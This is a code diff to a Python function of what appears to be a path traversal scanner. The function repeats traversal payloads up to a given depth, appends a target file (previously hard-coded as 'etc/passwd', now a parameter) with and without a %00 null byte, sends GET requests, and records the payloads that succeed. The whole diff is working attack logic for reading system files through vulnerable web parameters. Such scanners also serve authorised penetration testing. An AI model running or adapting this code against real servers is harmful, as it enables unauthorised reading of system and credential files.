@@ -71,44 +71,40 @@ def query(url,url2,keyword,files,dirs,depth,verbose,dl,summary, selected_payload
                 d+=1
     return (found, urls)
 
-def determine_payloads_query(url,url2,keyword,verbose,depth,paylist):
+def determine_payloads_query(url,url2,keyword,verbose,depth,paylist, file):
     payloads = []
-    linchk = "etc/passwd"
-    #winchk = "" TODO
-    files = [linchk]
     s = session()
     con2 = requests.get(url).content
-    for file in files:
-        for i in paylist:
-            d = 5
-            while d <= depth:
-                traverse=''
-                j=1
-                while j <= d:
-                    traverse+=i
-                    j+=1
-                requestlist = []
-                query = "?"+keyword+"="+traverse+file+url2
-                req = requests.Request(method='GET', url=url)
-                prep = req.prepare()
-                prep.url = url + query
-                r = s.send(prep)
-                requestlist.append(r)
-                query2="?"+keyword+"="+traverse+file+"%00"+url2
-                req = requests.Request(method='GET', url=url)
-                prep = req.prepare()
-                prep.url = url + query2
-                r = s.send(prep)
-                requestlist.append(r)
-                found = False
-                for r in requestlist:
-                    if str(r.status_code).startswith("2") or r.status_code == 302 or r.status_code == 403:
-                        if filecheck(r.content, con2):
-                            payloads.append(i)
-                            found = True
-                            print(color.RD + "[pl]" + color.END + color.O + " " + str(r.status_code) + color.END + " " + i)
-                d+=1
-                if found:
-                    break
+    for i in paylist:
+        d = 5
+        while d <= depth:
+            traverse=''
+            j=1
+            while j <= d:
+                traverse+=i
+                j+=1
+            requestlist = []
+            query = "?"+keyword+"="+traverse+file+url2
+            req = requests.Request(method='GET', url=url)
+            prep = req.prepare()
+            prep.url = url + query
+            r = s.send(prep)
+            requestlist.append(r)
+            query2="?"+keyword+"="+traverse+file+"%00"+url2
+            req = requests.Request(method='GET', url=url)
+            prep = req.prepare()
+            prep.url = url + query2
+            r = s.send(prep)
+            requestlist.append(r)
+            found = False
+            for r in requestlist:
+                if str(r.status_code).startswith("2") or r.status_code == 302 or r.status_code == 403:
+                    if filecheck(r.content, con2):
+                        payloads.append(i)
+                        found = True
+                        print(color.RD + "[pl]" + color.END + color.O + " " + str(r.status_code) + color.END + " " + i)
+            d+=1
+            if found:
+                break
     
     return payloads
